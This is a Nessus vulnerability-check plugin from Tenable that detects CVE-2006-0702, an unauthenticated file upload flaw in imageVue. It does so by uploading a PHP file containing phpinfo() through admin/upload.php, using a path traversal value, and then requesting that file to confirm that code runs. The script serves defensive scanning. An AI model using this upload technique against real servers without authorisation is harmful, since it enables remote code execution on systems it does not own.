#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(20991);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-0702");
  script_bugtraq_id(16594);
  script_xref(name:"OSVDB", value:"23169");

  script_name(english:"imageVue < 16.2 admin/upload.php Unrestricted File Upload");
  script_summary(english:"Checks for unauthorized file upload vulnerability in imageVue");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that allows arbitrary
uploads." );
 script_set_attribute(attribute:"description", value:
"The remote host is running imageVue, a web-based photo gallery
application written in PHP. 

The installed version of imageVue allows unauthenticated attackers to
upload arbitrary files, including files containing code that can then
be executed subject to the privileges of the web server user id. 

In addition, it is also reportedly affected by information disclosure
and cross-site scripting vulnerabilities, although Nessus has not
checked for those issues." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424745/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to imageVue 16.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/imagevue", "/imageVue", "/ImageVue", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Get a list of possible folders.
  req = http_get(item:string(dir, "/dir.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (isnull(res)) exit(0);

  # If it looks like it's from ImageVue...
  if (
    '<?xml version="1.0"' >< res &&
    '<folder path="' >< res
  ) {
    # Find a folder that allows uploads.
    while (res) {
      res = strstr(res, '<folder path="');
      if (res) {
        attr = res - strstr(res, ">");
        folder = ereg_replace(pattern:'^.+ path="([^"]+/)" .+ perm="7.+', replace:"\1", string:attr);
        break;
        res = strstr(res, ">") - ">";
      }
    }

    # Try to upload a file.
    if (folder) {
      file = string(rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_"), "-", unixtime(), ".php");

      boundary = "nessus";
      req = string(
        "POST ",  dir, "/admin/upload.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
        # nb: we'll add the Content-Length header and post data later.
      );
      boundary = string("--", boundary);
      postdata = string(
        boundary, "\r\n",
        'Content-Disposition: form-data; name="uploadFile"; filename="', file, '"', "\r\n",
        "Content-Type: application/x-php\r\n",
        "\r\n",
        "<?php phpinfo() ?>\r\n",

        boundary, "\r\n",
        'Content-Disposition: form-data; name="getpath"', "\r\n",
        "\r\n",
        "./../", folder, "\r\n",

        boundary, "--", "\r\n"
      );
      req = string(
        req,
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (isnull(res)) exit(0);

      # Finally, try to run the script we just uploaded.
      folder2 = urlencode(
         str:folder,
         unreserved:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/"
      );
      req = http_get(item:string(dir, "/", folder2, file), port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (isnull(res)) exit(0);

      # There's a problem if it looks like the output of phpinfo().
      if ("PHP Version" >< res) {
        security_hole(port);
      }
    }
  }
}
